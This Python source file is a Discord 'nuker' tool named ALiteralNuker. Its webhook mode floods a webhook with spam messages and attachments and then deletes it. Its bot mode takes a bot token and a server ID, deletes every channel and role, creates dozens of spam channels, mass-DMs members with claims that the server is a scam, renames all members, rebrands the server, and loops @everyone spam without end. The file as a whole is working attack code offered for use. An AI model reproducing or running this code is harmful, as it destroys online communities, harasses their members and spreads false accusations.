import requests
import discord
import asyncio
import os
import json
import random
from discord.ext import commands
from colorama import Fore, Style, init

init(autoreset=True)

      ##### ALITERALNUKER #####
##### Read readme.md before usage! #####


# Create ALiteralNuker folder & subfolders
base_folder = "ALiteralNuker"
attachments_folder = os.path.join(base_folder, "attachments")
assets_folder = os.path.join(base_folder, "assets")
webhook_file = os.path.join(base_folder, "deleted_webhooks.json")
icon_path = os.path.join(assets_folder, "icon.jpg")

os.makedirs(base_folder, exist_ok=True)
os.makedirs(attachments_folder, exist_ok=True)
os.makedirs(assets_folder, exist_ok=True)

if not os.path.exists(webhook_file):
    with open(webhook_file, "w") as f:
        json.dump([], f)

# Load deleted webhooks
def load_deleted_webhooks():
    with open(webhook_file, "r") as f:
        return json.load(f)

# Save deleted webhooks
def save_deleted_webhook(webhook_url):
    deleted_webhooks = load_deleted_webhooks()
    if webhook_url not in deleted_webhooks:
        deleted_webhooks.append(webhook_url)
        with open(webhook_file, "w") as f:
            json.dump(deleted_webhooks, f)

# Clear screen function
def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

# Main menu function
def main_menu():
    clear_screen()
    print(Fore.CYAN + r"""
██╗     ███╗   ██╗
██║     ████╗  ██║
██║     ██╔██╗ ██║
██║     ██║╚██╗██║
███████╗██║ ╚████║
╚══════╝╚═╝  ╚═══╝
                  """)
    
    print(Fore.RED + "🔥 ALiteralNuker - Made by LiterallySnowy 🔥")
    print(Fore.YELLOW + "[1] Webhook Bomber")
    print(Fore.YELLOW + "[2] Bot Server Bomber")
    return input(Fore.CYAN + "Choose mode (1 or 2): ")

# Start main menu loop
while True:
    choice = main_menu()

    # --- Webhook Bomber ---
    if choice == "1":
        webhook_url = input(Fore.CYAN + "Enter the webhook URL: ")

        # Check if the webhook was already deleted
        if webhook_url in load_deleted_webhooks():
            print(Fore.RED + "❌ This webhook was already deleted! ❌")
            input(Fore.YELLOW + "Press Enter to return to the menu...")
            continue

        message = input(Fore.CYAN + "Enter the spam message: ")
        attach_spam = input(Fore.CYAN + "Do you want to spam attachments? (y/n): ").lower()
        repeat = int(input(Fore.CYAN + "How many times to spam?: "))

        for i in range(repeat):
            payload = {"content": f"{message} [ Nuked with ALiteralNuker ✓ ]"}
            requests.post(webhook_url, json=payload)
            print(Fore.GREEN + f"Sent message {i+1}/{repeat}")

            if attach_spam == "y":
                files = os.listdir(attachments_folder)
                if files:
                    file_path = os.path.join(attachments_folder, random.choice(files))
                    requests.post(webhook_url, files={"file": open(file_path, "rb")})
                    print(Fore.MAGENTA + f"Sent attachment: {file_path}")

        requests.delete(webhook_url)
        save_deleted_webhook(webhook_url)  # Save the deleted webhook
        print(Fore.RED + "🔥 Webhook deleted! 🔥")

        input(Fore.YELLOW + "Press Enter to return to the menu...")

    # --- Bot Server Bomber ---
    elif choice == "2":
        bot_token = input(Fore.CYAN + "Enter bot token: ")
        bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

        @bot.event
        async def on_ready():
            print(Fore.GREEN + f"🔥 Logged in as {bot.user} 🔥")

            guild_id = int(input(Fore.CYAN + "Enter Server ID to nuke: "))
            guild = bot.get_guild(guild_id)

            if not guild:
                print(Fore.RED + "❌ Bot is not in the server!")
                return

            # DM all members with server name
            for member in guild.members:
                try:
                    await member.send(f"🔥 This server is being nuked! Server Name: {guild.name}")
                    print(Fore.BLUE + f"Sent DM to {member.name}")
                except:
                    print(Fore.YELLOW + f"Failed to DM {member.name}")

            # Delete channels
            for channel in guild.channels:
                try:
                    await channel.delete()
                    print(Fore.RED + f"Deleted channel: {channel.name}")
                except:
                    print(Fore.YELLOW + f"Failed to delete: {channel.name}")

            # Create spam channels
            for _ in range(50):
                await guild.create_text_channel("nuked-by-literalnuker")
                print(Fore.GREEN + "Created spam channel.")

            # Delete roles
            for role in guild.roles:
                try:
                    await role.delete()
                    print(Fore.RED + f"Deleted role: {role.name}")
                except:
                    print(Fore.YELLOW + f"Failed to delete: {role.name}")

            # Mass DM everyone
            for member in guild.members:
                try:
                    await member.send("🔥 This server is a SCAM! Leave now. 🔥")
                    print(Fore.BLUE + f"Sent DM to {member.name}")
                except:
                    print(Fore.YELLOW + f"Failed to DM {member.name}")

            # Mass nickname change
            for member in guild.members:
                try:
                    await member.edit(nick="NukedBySnowy")
                    print(Fore.MAGENTA + f"Renamed {member.name}")
                except:
                    print(Fore.YELLOW + f"Failed to rename {member.name}")

            # Server name change & icon change
            try:
                await guild.edit(name="Nuked by ALiteralNuker")

                if os.path.exists(icon_path):
                    with open(icon_path, "rb") as icon:
                        await guild.edit(icon=icon.read())
                    print(Fore.CYAN + "🔥 Server name & icon changed! 🔥")
                else:
                    print(Fore.YELLOW + "⚠️ No icon found in ALiteralNuker/assets/ ⚠️")

            except:
                print(Fore.YELLOW + "❌ Failed to change name/icon.")

            # Looping spam in all channels
            while True:
                for channel in guild.text_channels:
                    try:
                        await channel.send("@everyone [ Nuked with ALiteralNuker ✓ ]")
                        print(Fore.RED + f"Spammed in {channel.name}")
                    except:
                        print(Fore.YELLOW + f"Failed to spam in {channel.name}")

        bot.run(bot_token)

    else:
        print(Fore.RED + "❌ Invalid option! Try again.")
